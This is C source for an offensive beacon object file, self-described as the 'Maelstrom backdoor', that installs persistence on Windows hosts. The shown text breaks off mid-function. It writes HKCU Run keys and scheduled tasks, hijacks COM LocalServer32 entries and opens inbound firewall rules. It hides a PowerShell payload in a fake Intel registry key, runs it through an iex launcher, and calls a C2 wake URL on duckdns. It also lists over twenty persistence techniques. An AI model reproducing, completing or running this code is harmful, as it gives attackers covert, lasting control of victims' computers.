/*
 * Maelstrom backdoor BOF — APT recovery
 *
 * recon:  help | list | paths | priv | status | check <id>
 * apply:  apply <id> [a] [b] [c]     one id per Demon (Coffee/WaitCrypt)
 * clean:  clean <id>|all             drop persist for that id (sshd/WinRM stay)
 *
 * Patterns stolen (source, not .o):
 *   COM-Hunter LocalServer32 / TreatAs / MsCtfMonitor CLSID
 *   COM_Hijack_BOF CacheTask CLSID
 *   addportproxy-bof PortProxy registry + iphlpsvc PARAMCHANGE
 *   PersistBOF Startup folder (file, no DLL)
 *   WMIPersistKit explorer.exe process-start filter
 *   rvrsh3ll RegistryPersistence KEY_WOW64_64KEY
 *
 * Coffee: wait=0 CreateProcess, no sockets. HMAC lives in dropped files.
 * Inbound 10.66.0.0/24. Never WAN 22/5985. Keys = files.
 */
#include "beacon.h"
#include <windows.h>
#include <winsvc.h>

#ifndef TOKEN_QUERY
#define TOKEN_QUERY 0x0008
#endif
#ifndef TokenUser
#define TokenUser 1
#endif
#ifndef TokenElevationType
#define TokenElevationType 18
#endif
#ifndef TokenIntegrityLevel
#define TokenIntegrityLevel 25
#endif
#ifndef TokenPrivileges
#define TokenPrivileges 3
#endif
#ifndef SE_PRIVILEGE_ENABLED
#define SE_PRIVILEGE_ENABLED 0x00000002
#endif
#ifndef ERROR_INSUFFICIENT_BUFFER
#define ERROR_INSUFFICIENT_BUFFER 122
#endif
#ifndef SERVICE_QUERY_STATUS
#define SERVICE_QUERY_STATUS 0x0004
#endif
#ifndef SERVICE_PAUSE_CONTINUE
#define SERVICE_PAUSE_CONTINUE 0x0040
#endif
#ifndef SERVICE_CONTROL_PARAMCHANGE
#define SERVICE_CONTROL_PARAMCHANGE 0x00000006
#endif
#ifndef SC_MANAGER_CONNECT
#define SC_MANAGER_CONNECT 0x0001
#endif
#ifndef INVALID_FILE_ATTRIBUTES
#define INVALID_FILE_ATTRIBUTES ((DWORD)-1)
#endif
#ifndef CREATE_NO_WINDOW
#define CREATE_NO_WINDOW 0x08000000
#endif
#ifndef DETACHED_PROCESS
#define DETACHED_PROCESS 0x00000008
#endif
#ifndef CREATE_NEW_PROCESS_GROUP
#define CREATE_NEW_PROCESS_GROUP 0x00000200
#endif
#ifndef SW_HIDE
#define SW_HIDE 0
#endif
#ifndef STARTF_USESHOWWINDOW
#define STARTF_USESHOWWINDOW 0x00000001
#endif
#ifndef GENERIC_READ
#define GENERIC_READ 0x80000000L
#endif
#ifndef GENERIC_WRITE
#define GENERIC_WRITE 0x40000000L
#endif
#ifndef FILE_SHARE_READ
#define FILE_SHARE_READ 0x00000001
#endif
#ifndef FILE_APPEND_DATA
#define FILE_APPEND_DATA 0x0004
#endif
#ifndef CREATE_ALWAYS
#define CREATE_ALWAYS 2
#endif
#ifndef OPEN_EXISTING
#define OPEN_EXISTING 3
#endif
#ifndef OPEN_ALWAYS
#define OPEN_ALWAYS 4
#endif
#ifndef FILE_ATTRIBUTE_NORMAL
#define FILE_ATTRIBUTE_NORMAL 0x00000080
#endif
#ifndef FILE_ATTRIBUTE_DIRECTORY
#define FILE_ATTRIBUTE_DIRECTORY 0x00000010
#endif
#ifndef KEY_SET_VALUE
#define KEY_SET_VALUE 0x0002
#endif
#ifndef KEY_CREATE_SUB_KEY
#define KEY_CREATE_SUB_KEY 0x0004
#endif
#ifndef KEY_WOW64_64KEY
#define KEY_WOW64_64KEY 0x0100
#endif
#ifndef KEY_WRITE
#define KEY_WRITE 0x20006
#endif
#ifndef REG_SZ
#define REG_SZ 1
#endif
#ifndef REG_DWORD
#define REG_DWORD 4
#endif
#ifndef REG_OPTION_NON_VOLATILE
#define REG_OPTION_NON_VOLATILE 0
#endif
#ifndef HKEY_CURRENT_USER
#define HKEY_CURRENT_USER ((HKEY)(ULONG_PTR)0x80000001)
#endif
#ifndef HKEY_LOCAL_MACHINE
#define HKEY_LOCAL_MACHINE ((HKEY)(ULONG_PTR)0x80000002)
#endif
#ifndef ERROR_SUCCESS
#define ERROR_SUCCESS 0L
#endif
#ifndef INVALID_HANDLE_VALUE
#define INVALID_HANDLE_VALUE ((HANDLE)(LONG_PTR)-1)
#endif

#define CLSID_BD       "{8B4E3D9A-6C2F-4A11-9D4E-B7C1A2E3F406}"
#define CLSID_CTF      "{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" /* COM-Hunter MsCtfMonitor logon */
#define CLSID_CACHE    "{0358B920-0AC7-461F-98F4-58E32CD89148}" /* COM_Hijack_BOF CacheTask logon */
#define RUN_WAKE       "MaelBdWake"
#define TASK_WAKE      "MaelBdWake"
#define TASK_DNS       "MaelBdDns"
#define TASK_DOH       "MaelBdDoh"
#define TASK_COM       "MaelBdCOM"
#define TASK_SSH       "MaelBdSsh"
#define TASK_SPA       "MaelBdSpa"
#define TASK_HTA       "MaelBdHta"
#define SPA_PORT       62201
#define FW_SPA         "RiptideSPA-62201"
#define FW_WINRM       "RiptideWinRM"
#define FW_SSH         "RiptideSSH"
#define WG_NET         "10.66.0.0/24"
#define DEF_WAKE       "https://maelstrom-c2.duckdns.org/cdn/img/p1-reg.jpg"
#define REG_IPMA       "Software\\Intel\\PowerManager"

WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess(VOID);
WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
WINBASEAPI DWORD WINAPI KERNEL32$GetEnvironmentVariableA(LPCSTR, LPSTR, DWORD);
WINBASEAPI DWORD WINAPI KERNEL32$GetFileAttributesA(LPCSTR);
WINBASEAPI DWORD WINAPI KERNEL32$GetTickCount(VOID);
WINBASEAPI BOOL WINAPI KERNEL32$CreateDirectoryA(LPCSTR, LPSECURITY_ATTRIBUTES);
WINBASEAPI BOOL WINAPI KERNEL32$CreateProcessA(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
WINBASEAPI BOOL WINAPI KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
WINBASEAPI BOOL WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
WINBASEAPI DWORD WINAPI KERNEL32$GetFileSize(HANDLE, LPDWORD);
WINBASEAPI BOOL WINAPI KERNEL32$DeleteFileA(LPCSTR);
WINADVAPI BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
WINADVAPI BOOL WINAPI ADVAPI32$GetTokenInformation(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
WINADVAPI BOOL WINAPI ADVAPI32$LookupPrivilegeNameA(LPCSTR, PLUID, LPSTR, LPDWORD);
WINADVAPI BOOL WINAPI ADVAPI32$LookupAccountSidA(LPCSTR, PSID, LPSTR, LPDWORD, LPSTR, LPDWORD, PSID_NAME_USE);
WINADVAPI PUCHAR WINAPI ADVAPI32$GetSidSubAuthorityCount(PSID);
WINADVAPI PDWORD WINAPI ADVAPI32$GetSidSubAuthority(PSID, DWORD);
WINADVAPI SC_HANDLE WINAPI ADVAPI32$OpenSCManagerA(LPCSTR, LPCSTR, DWORD);
WINADVAPI SC_HANDLE WINAPI ADVAPI32$OpenServiceA(SC_HANDLE, LPCSTR, DWORD);
WINADVAPI BOOL WINAPI ADVAPI32$QueryServiceStatus(SC_HANDLE, LPSERVICE_STATUS);
WINADVAPI BOOL WINAPI ADVAPI32$ControlService(SC_HANDLE, DWORD, LPSERVICE_STATUS);
WINADVAPI BOOL WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE);
WINADVAPI LONG WINAPI ADVAPI32$RegCreateKeyExA(HKEY, LPCSTR, DWORD, LPSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
WINADVAPI LONG WINAPI ADVAPI32$RegSetValueExA(HKEY, LPCSTR, DWORD, DWORD, const BYTE *, DWORD);
WINADVAPI LONG WINAPI ADVAPI32$RegCloseKey(HKEY);
WINBASEAPI int __cdecl MSVCRT$_snprintf(char *, size_t, const char *, ...);
WINBASEAPI int __cdecl MSVCRT$_stricmp(const char *, const char *);
WINBASEAPI int __cdecl MSVCRT$_strnicmp(const char *, const char *, size_t);
WINBASEAPI size_t __cdecl MSVCRT$strlen(const char *);
WINBASEAPI char * __cdecl MSVCRT$strchr(const char *, int);
WINBASEAPI char * __cdecl MSVCRT$strstr(const char *, const char *);

typedef struct _SID_AND_ATTR_B {
    PSID Sid;
    DWORD Attributes;
} SID_AND_ATTR_B;

typedef struct _TOKEN_MANDATORY_B {
    SID_AND_ATTR_B Label;
} TOKEN_MANDATORY_B;

typedef struct _LUID_AND_ATTR_B {
    LUID Luid;
    DWORD Attributes;
} LUID_AND_ATTR_B;

typedef struct _TOKEN_PRIVS_B {
    DWORD PrivilegeCount;
    LUID_AND_ATTR_B Privileges[1];
} TOKEN_PRIVS_B;

typedef struct _TOKEN_USER_B {
    SID_AND_ATTR_B User;
} TOKEN_USER_B;

static char g_spawn[1600];
static char g_cmd[1600];
static char g_body[2800];

static int nonempty(const char *s)
{
    return s && s[0];
}

static int eq(const char *a, const char *b)
{
    if (!a || !b)
        return 0;
    return MSVCRT$_stricmp(a, b) == 0;
}

static const char *integrity_name(DWORD rid)
{
    if (rid >= 0x00005000)
        return "Protected (PPL-class SID, not a license to load .sys)";
    if (rid >= 0x00004000)
        return "System";
    if (rid >= 0x00003000)
        return "High (admin)";
    if (rid >= 0x00002000)
        return "Medium";
    if (rid >= 0x00001000)
        return "Low";
    return "Untrusted";
}

static const char *svc_state(DWORD s)
{
    switch (s) {
    case 1: return "stopped";
    case 2: return "start_pending";
    case 3: return "stop_pending";
    case 4: return "running";
    case 5: return "continue_pending";
    case 6: return "pause_pending";
    case 7: return "paused";
    default: return "?";
    }
}

static void zmem(void *q, unsigned n)
{
    unsigned i;
    char *p = (char *)q;
    for (i = 0; i < n; i++)
        p[i] = 0;
}

static int env_get(char *out, unsigned n, const char *e)
{
    DWORD m;
    if (!out || n < 2)
        return 0;
    m = KERNEL32$GetEnvironmentVariableA(e, out, n);
    return m && m < n;
}

static int join2(char *out, unsigned n, const char *a, const char *b)
{
    if (!out || !a)
        return 0;
    if (b && b[0])
        MSVCRT$_snprintf(out, n, "%s\\%s", a, b);
    else
        MSVCRT$_snprintf(out, n, "%s", a);
    return out[0] != 0;
}

static int exists(const char *path)
{
    DWORD a;
    if (!nonempty(path))
        return 0;
    a = KERNEL32$GetFileAttributesA(path);
    return a != INVALID_FILE_ATTRIBUTES;
}

static int join_env(char *out, unsigned n, const char *e, const char *tail)
{
    char base[MAX_PATH];
    if (!env_get(base, sizeof(base), e))
        return 0;
    return join2(out, n, base, tail);
}

static void probe_path(const char *label, const char *path)
{
    DWORD a = KERNEL32$GetFileAttributesA(path);
    if (a == INVALID_FILE_ATTRIBUTES)
        BeaconPrintf(CALLBACK_OUTPUT, "  %-16s miss  %s\n", label, path);
    else if (a & FILE_ATTRIBUTE_DIRECTORY)
        BeaconPrintf(CALLBACK_OUTPUT, "  %-16s dir   %s\n", label, path);
    else
        BeaconPrintf(CALLBACK_OUTPUT, "  %-16s file  %s\n", label, path);
}

static void expand_probe(const char *label, const char *env, const char *tail)
{
    char full[MAX_PATH];
    if (!join_env(full, sizeof(full), env, tail))
        return;
    probe_path(label, full);
}

static void svc_probe(const char *name)
{
    SC_HANDLE scm, h;
    SERVICE_STATUS st;
    scm = ADVAPI32$OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm) {
        BeaconPrintf(CALLBACK_OUTPUT, "  svc %-18s scm-err %u\n", name, KERNEL32$GetLastError());
        return;
    }
    h = ADVAPI32$OpenServiceA(scm, name, SERVICE_QUERY_STATUS);
    if (!h) {
        BeaconPrintf(CALLBACK_OUTPUT, "  svc %-18s absent  (err %u)\n", name, KERNEL32$GetLastError());
        ADVAPI32$CloseServiceHandle(scm);
        return;
    }
    if (ADVAPI32$QueryServiceStatus(h, &st))
        BeaconPrintf(CALLBACK_OUTPUT, "  svc %-18s %s\n", name, svc_state(st.dwCurrentState));
    else
        BeaconPrintf(CALLBACK_OUTPUT, "  svc %-18s query-err %u\n", name, KERNEL32$GetLastError());
    ADVAPI32$CloseServiceHandle(h);
    ADVAPI32$CloseServiceHandle(scm);
}

static DWORD spawn(const char *cmd)
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    DWORD pid, fl;

    zmem(&si, sizeof(si));
    zmem(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    /* CREATE_NO_WINDOW ignored with DETACHED_PROCESS — do not combine. No cmd.exe wrap. */
    fl = CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP;
    MSVCRT$_snprintf(g_spawn, sizeof(g_spawn), "%s", cmd);
    if (!KERNEL32$CreateProcessA(NULL, g_spawn, NULL, NULL, FALSE, fl, NULL, NULL, &si, &pi)) {
        pid = KERNEL32$GetLastError();
        BeaconPrintf(CALLBACK_ERROR, "[backdoor] CreateProcess err=%u\n", pid);
        return pid;
    }
    /* never WaitForSingleObject — WaitCrypt XOR kills Coffee */
    pid = pi.dwProcessId;
    KERNEL32$CloseHandle(pi.hProcess);
    KERNEL32$CloseHandle(pi.hThread);
    BeaconPrintf(CALLBACK_OUTPUT, "[backdoor] spawn pid=%u\n", pid);
    return pid;
}

static int reg_sz(HKEY root, const char *key, const char *name, const char *data)
{
    HKEY hk = NULL;
    LONG st;
    DWORD n;
    st = ADVAPI32$RegCreateKeyExA(
        root, key, 0, NULL, REG_OPTION_NON_VOLATILE,
        KEY_WRITE | KEY_WOW64_64KEY, NULL, &hk, NULL);
    if (st != ERROR_SUCCESS || !hk) {
        BeaconPrintf(CALLBACK_ERROR, "[backdoor] RegCreate %ld\n", st);
        return 0;
    }
    n = (DWORD)MSVCRT$strlen(data) + 1;
    st = ADVAPI32$RegSetValueExA(hk, name, 0, REG_SZ, (const BYTE *)data, n);
    ADVAPI32$RegCloseKey(hk);
    if (st != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[backdoor] RegSet %ld\n", st);
        return 0;
    }
    return 1;
}

static int reg_dw(HKEY root, const char *key, const char *name, DWORD v)
{
    HKEY hk = NULL;
    LONG st;
    st = ADVAPI32$RegCreateKeyExA(
        root, key, 0, NULL, REG_OPTION_NON_VOLATILE,
        KEY_WRITE | KEY_WOW64_64KEY, NULL, &hk, NULL);
    if (st != ERROR_SUCCESS || !hk) {
        BeaconPrintf(CALLBACK_ERROR, "[backdoor] RegCreate dw %ld\n", st);
        return 0;
    }
    st = ADVAPI32$RegSetValueExA(hk, name, 0, REG_DWORD, (const BYTE *)&v, sizeof(v));
    ADVAPI32$RegCloseKey(hk);
    return st == ERROR_SUCCESS;
}

static DWORD current_il(void)
{
    HANDLE tok = NULL;
    BYTE buf[256];
    DWORD need = 0, rid = 0;
    TOKEN_MANDATORY_B *il;
    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &tok))
        return 0;
    if (ADVAPI32$GetTokenInformation(tok, (TOKEN_INFORMATION_CLASS)TokenIntegrityLevel, buf, sizeof(buf), &need)) {
        il = (TOKEN_MANDATORY_B *)buf;
        if (il->Label.Sid)
            rid = *ADVAPI32$GetSidSubAuthority(
                il->Label.Sid,
                (DWORD)(*ADVAPI32$GetSidSubAuthorityCount(il->Label.Sid) - 1));
    }
    KERNEL32$CloseHandle(tok);
    return rid;
}

static int need_high(const char *id)
{
    DWORD rid = current_il();
    if (rid >= 0x00003000 || BeaconIsAdmin())
        return 1;
    BeaconPrintf(CALLBACK_ERROR, "[apply %s] NEED High/Admin\n", id);
    return 0;
}

static int wan_refuse(const char *s)
{
    if (!nonempty(s))
        return 0;
    if (eq(s, "wan") || eq(s, "any") || eq(s, "*") || eq(s, "0.0.0.0") || eq(s, "::")
        || eq(s, "internet") || eq(s, "public"))
        return 1;
    if (MSVCRT$strstr(s, "0.0.0.0"))
        return 1;
    return 0;
}

static int url_ok(const char *u)
{
    if (!nonempty(u) || MSVCRT$strlen(u) < 8)
        return 0;
    if (MSVCRT$strchr(u, '"') || MSVCRT$strchr(u, '\'') || MSVCRT$strchr(u, '\r') || MSVCRT$strchr(u, '\n'))
        return 0;
    return 1;
}

static int secret_ok(const char *s)
{
    unsigned i;
    if (!nonempty(s) || MSVCRT$strlen(s) > 64)
        return 0;
    for (i = 0; s[i]; i++) {
        char c = s[i];
        if (c == '"' || c == '\'' || c == '`' || c == '%' || c == '$' || c == ';' || c == '|')
            return 0;
    }
    return 1;
}

static int find_curl(char *out, unsigned n)
{
    char p[MAX_PATH];
    if (join_env(p, sizeof(p), "SystemRoot", "System32\\curl.exe") && exists(p)) {
        MSVCRT$_snprintf(out, n, "%s", p);
        return 1;
    }
    MSVCRT$_snprintf(out, n, "curl.exe");
    return 0;
}

static int find_ssh(char *out, unsigned n)
{
    char p[MAX_PATH];
    if (join_env(p, sizeof(p), "SystemRoot", "System32\\OpenSSH\\ssh.exe") && exists(p)) {
        MSVCRT$_snprintf(out, n, "%s", p);
        return 1;
    }
    if (join_env(p, sizeof(p), "ProgramFiles", "OpenSSH\\ssh.exe") && exists(p)) {
        MSVCRT$_snprintf(out, n, "%s", p);
        return 1;
    }
    return 0;
}

static int find_idfile(char *out, unsigned n)
{
    char p[MAX_PATH];
    if (join_env(p, sizeof(p), "USERPROFILE", ".ssh\\ania-agent\\id_ed25519") && exists(p)) {
        MSVCRT$_snprintf(out, n, "%s", p);
        return 1;
    }
    if (join_env(p, sizeof(p), "USERPROFILE", ".ssh\\id_ed25519") && exists(p)) {
        MSVCRT$_snprintf(out, n, "%s", p);
        return 1;
    }
    return 0;
}

static int mkdir_p(const char *path)
{
    if (exists(path))
        return 1;
    KERNEL32$CreateDirectoryA(path, NULL);
    return exists(path);
}

static int intel_dir(char *out, unsigned n)
{
    char base[MAX_PATH], p1[MAX_PATH];
    if (!env_get(base, sizeof(base), "LOCALAPPDATA"))
        return 0;
    join2(p1, sizeof(p1), base, "Intel");
    mkdir_p(p1);
    join2(out, n, p1, "PowerManager");
    mkdir_p(out);
    return exists(out);
}

static int write_all(const char *path, const char *data)
{
    HANDLE h;
    DWORD w = 0, n;
    if (!nonempty(path) || !data)
        return 0;
    h = KERNEL32$CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[backdoor] write %s err=%u\n", path, KERNEL32$GetLastError());
        return 0;
    }
    n = (DWORD)MSVCRT$strlen(data);
    KERNEL32$WriteFile(h, data, n, &w, NULL);
    KERNEL32$CloseHandle(h);
    return w > 0;
}

static int file_has(const char *path, const char *needle)
{
    HANDLE h;
    DWORD sz, rd = 0;
    char tmp[4096];
    if (!exists(path) || !nonempty(needle))
        return 0;
    h = KERNEL32$CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE)
        return 0;
    sz = KERNEL32$GetFileSize(h, NULL);
    if (sz == (DWORD)-1 || sz == 0) {
        KERNEL32$CloseHandle(h);
        return 0;
    }
    if (sz >= sizeof(tmp))
        sz = (DWORD)sizeof(tmp) - 1;
    if (!KERNEL32$ReadFile(h, tmp, sz, &rd, NULL)) {
        KERNEL32$CloseHandle(h);
        return 0;
    }
    KERNEL32$CloseHandle(h);
    tmp[rd] = 0;
    return MSVCRT$strstr(tmp, needle) != 0;
}

static int persist_run(const char *name, const char *cmdline)
{
    if (reg_sz(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", name, cmdline)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[backdoor] HKCU Run\\%s ok\n", name);
        return 1;
    }
    return 0;
}

static void persist_task(const char *tn, const char *sched, const char *tr)
{
    MSVCRT$_snprintf(
        g_cmd, sizeof(g_cmd),
        "C:\\Windows\\System32\\schtasks.exe /create /tn %s /sc %s /rl LIMITED /f /tr \"%s\"",
        tn, sched, tr);
    spawn(g_cmd);
}

static int stash_wake(const char *url)
{
    char curl[MAX_PATH], ps[900];
    const char *u = url_ok(url) ? url : DEF_WAKE;
    find_curl(curl, sizeof(curl));
    MSVCRT$_snprintf(
        ps, sizeof(ps),
        "Start-Process -WindowStyle Hidden -FilePath '%s' -ArgumentList '-sS','-m','25','-o','NUL','%s'",
        curl, u);
    if (!reg_sz(HKEY_CURRENT_USER, REG_IPMA, "Data", ps))
        return 0;
    BeaconPrintf(CALLBACK_OUTPUT, "[backdoor] HKCU %s\\Data (payload in-reg)\n", REG_IPMA);
    return 1;
}

static int drop_wake_cmd(const char *url, char *out, unsigned n)
{
    char dir[MAX_PATH];
    if (!stash_wake(url))
        return 0;
    if (!intel_dir(dir, sizeof(dir))) {
        BeaconPrintf(CALLBACK_ERROR, "[backdoor] LOCALAPPDATA\\Intel\\PowerManager\n");
        return 0;
    }
    join2(out, n, dir, "ipma-reg.ps1");
    MSVCRT$_snprintf(
        g_body, sizeof(g_body),
        "$ErrorActionPreference='SilentlyContinue'\r\n"
        "iex ((Get-ItemProperty -LiteralPath 'HKCU:\\Software\\Intel\\PowerManager').Data)\r\n");
    if (!write_all(out, g_body))
        return 0;
    BeaconPrintf(CALLBACK_OUTPUT, "[backdoor] drop launcher %s (no HMAC in file)\n", out);
    return 1;
}

static void cmd_as_file(char *out, unsigned n, const char *file)
{
    MSVCRT$_snprintf(
        out, n,
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -File %s",
        file);
}

static void ps_file_line(char *out, unsigned n, const char *ps1)
{
    MSVCRT$_snprintf(
        out, n,
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -File \"%s\"",
        ps1);
}

static void fw_in(const char *name, const char *proto, int port)
{
    MSVCRT$_snprintf(
        g_cmd, sizeof(g_cmd),
        "C:\\Windows\\System32\\netsh.exe advfirewall firewall add rule name=%s dir=in action=allow protocol=%s localport=%d remoteip=%s",
        name, proto, port, WG_NET);
    spawn(g_cmd);
}

static void com_localserver(const char *clsid, const char *payload)
{
    char key[220];
    MSVCRT$_snprintf(key, sizeof(key), "Software\\Classes\\CLSID\\%s\\LocalServer32", clsid);
    if (reg_sz(HKEY_CURRENT_USER, key, NULL, payload))
        BeaconPrintf(CALLBACK_OUTPUT, "[com] HKCU CLSID %s LocalServer32 ok\n", clsid);
}

static void iphlp_reload(void)
{
    SC_HANDLE scm, h;
    SERVICE_STATUS st;
    scm = ADVAPI32$OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm)
        return;
    h = ADVAPI32$OpenServiceA(scm, "iphlpsvc", SERVICE_PAUSE_CONTINUE);
    if (!h) {
        ADVAPI32$CloseServiceHandle(scm);
        return;
    }
    if (ADVAPI32$ControlService(h, SERVICE_CONTROL_PARAMCHANGE, &st))
        BeaconPrintf(CALLBACK_OUTPUT, "[proxy] iphlpsvc PARAMCHANGE ok\n");
    else
        BeaconPrintf(CALLBACK_OUTPUT, "[proxy] iphlpsvc PARAMCHANGE err=%u (key still set)\n", KERNEL32$GetLastError());
    ADVAPI32$CloseServiceHandle(h);
    ADVAPI32$CloseServiceHandle(scm);
}

static void cmd_help(void)
{
    BeaconPrintf(CALLBACK_OUTPUT,
        "backdoor — APT recovery (BOF). One Coffee shot per Demon.\n"
        "  help | list                 (also Python-local)\n"
        "  paths | priv | status\n"
        "  check <id>\n"
        "  apply <id> [a] [b]\n"
        "  clean <id>|all\n"
        "ids: wake ssh sshkey knock dns doh bits com treatas logon\n"
        "     startup profile active autorun mshta winrm proxy wmi time sshd ifeo\n"
        "inbound only %s. never WAN 22/5985. keys = file.\n"
        "knock = SPA HMAC-SHA256 UDP :%d (not WoL).\n",
        WG_NET, SPA_PORT);
}

static void cmd_list(void)
{
    BeaconPrintf(CALLBACK_OUTPUT, "id       priv     apply                                src\n");
    BeaconPrintf(CALLBACK_OUTPUT, "-------- -------- ------------------------------------ ----------------\n");
    BeaconPrintf(CALLBACK_OUTPUT, "wake     Medium   curl file + HKCU Run + ONLOGON      T1053+T1547.001\n");
    BeaconPrintf(CALLBACK_OUTPUT, "ssh      Medium   ssh.exe -R persist                   T1021.004\n");
    BeaconPrintf(CALLBACK_OUTPUT, "sshkey   Medium   authorized_keys APPEND               T1098.004\n");
    BeaconPrintf(CALLBACK_OUTPUT, "knock    Medium   SPA HMAC UDP :%d persist            fwknop-class\n", SPA_PORT);
    BeaconPrintf(CALLBACK_OUTPUT, "dns      Medium   TXT parse + curl 30m                 T1071.004\n");
    BeaconPrintf(CALLBACK_OUTPUT, "doh      Medium   DoH cloudflare TXT 30m               T1572\n");
    BeaconPrintf(CALLBACK_OUTPUT, "bits     Medium   T1197 + SetNotifyCmdLine             T1197\n");
    BeaconPrintf(CALLBACK_OUTPUT, "com      Medium   MsCtfMonitor+CacheTask LocalServer32 COM-Hunter\n");
    BeaconPrintf(CALLBACK_OUTPUT, "treatas  Medium   TreatAs -> our CLSID                 COM-Hunter\n");
    BeaconPrintf(CALLBACK_OUTPUT, "logon    Medium   T1037 UserInitMprLogonScript         T1037.001\n");
    BeaconPrintf(CALLBACK_OUTPUT, "startup  Medium   Startup\\IpmaUpdate.cmd              PersistBOF\n");
    BeaconPrintf(CALLBACK_OUTPUT, "profile  Medium   PowerShell profile                   T1546.013\n");
    BeaconPrintf(CALLBACK_OUTPUT, "active   Medium   Active Setup StubPath                T1547.014\n");
    BeaconPrintf(CALLBACK_OUTPUT, "autorun  Medium   cmd AutoRun                          T1546.001\n");
    BeaconPrintf(CALLBACK_OUTPUT, "mshta    Medium   signed CDN .hta                      T1218.005\n");
    BeaconPrintf(CALLBACK_OUTPUT, "winrm    High     5985 fw %s                           T1021.006\n", WG_NET);
    BeaconPrintf(CALLBACK_OUTPUT, "proxy    Admin    PortProxy registry (no netsh)        addportproxy-bof\n");
    BeaconPrintf(CALLBACK_OUTPUT, "wmi      Admin    explorer.exe start consumer          WMIPersistKit\n");
    BeaconPrintf(CALLBACK_OUTPUT, "time     SYSTEM   Time Provider if DLL on disk         PersistBOF\n");
    BeaconPrintf(CALLBACK_OUTPUT, "sshd     High     OpenSSH + fw overlay (keep LAN)      T1133\n");
    BeaconPrintf(CALLBACK_OUTPUT, "ifeo     High     SilentProcessExit WerFault           T1546.012\n");
}

static void cmd_paths(void)
{
    BeaconPrintf(CALLBACK_OUTPUT, "[paths] tick=%u\n", KERNEL32$GetTickCount());
    expand_probe("ssh", "SystemRoot", "System32\\OpenSSH\\ssh.exe");
    expand_probe("sshd", "SystemRoot", "System32\\OpenSSH\\sshd.exe");
    expand_probe("ssh-pf", "ProgramFiles", "OpenSSH\\ssh.exe");
    expand_probe("curl", "SystemRoot", "System32\\curl.exe");
    expand_probe("certreq", "SystemRoot", "System32\\certreq.exe");
    expand_probe("bitsadmin", "SystemRoot", "System32\\bitsadmin.exe");
    expand_probe("netsh", "SystemRoot", "System32\\netsh.exe");
    expand_probe("winrs", "SystemRoot", "System32\\winrs.exe");
    expand_probe("mshta", "SystemRoot", "System32\\mshta.exe");
    expand_probe("powershell", "SystemRoot", "System32\\WindowsPowerShell\\v1.0\\powershell.exe");
    expand_probe("nslookup", "SystemRoot", "System32\\nslookup.exe");
    expand_probe("user-.ssh", "USERPROFILE", ".ssh");
    expand_probe("user-ak", "USERPROFILE", ".ssh\\authorized_keys");
    expand_probe("ania-id", "USERPROFILE", ".ssh\\ania-agent\\id_ed25519");
    expand_probe("sys-ak", "ProgramData", "ssh\\administrators_authorized_keys");
    expand_probe("ipmasvc", "PUBLIC", "ipmasvc.exe");
    expand_probe("intel-dir", "LOCALAPPDATA", "Intel\\PowerManager");
}

static void cmd_priv(void)
{
    HANDLE tok = NULL;
    BYTE buf[512];
    DWORD need = 0, i, rid = 0;
    TOKEN_MANDATORY_B *il;
    TOKEN_USER_B *tu;
    TOKEN_PRIVS_B *tp;
    char user[128], dom[128], priv[128];
    DWORD ulen, dlen, plen;
    SID_NAME_USE use;
    DWORD etype = 0;

    BeaconPrintf(CALLBACK_OUTPUT, "[priv] admin_bof=%s\n", BeaconIsAdmin() ? "yes" : "no");
    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &tok)) {
        BeaconPrintf(CALLBACK_ERROR, "[priv] OpenProcessToken err=%u\n", KERNEL32$GetLastError());
        return;
    }
    if (ADVAPI32$GetTokenInformation(tok, (TOKEN_INFORMATION_CLASS)TokenIntegrityLevel, buf, sizeof(buf), &need)) {
        il = (TOKEN_MANDATORY_B *)buf;
        if (il->Label.Sid) {
            rid = *ADVAPI32$GetSidSubAuthority(
                il->Label.Sid,
                (DWORD)(*ADVAPI32$GetSidSubAuthorityCount(il->Label.Sid) - 1));
            BeaconPrintf(CALLBACK_OUTPUT, "[priv] integrity rid=0x%X %s\n", rid, integrity_name(rid));
        }
    }
    need = sizeof(etype);
    if (ADVAPI32$GetTokenInformation(tok, (TOKEN_INFORMATION_CLASS)TokenElevationType, &etype, sizeof(etype), &need))
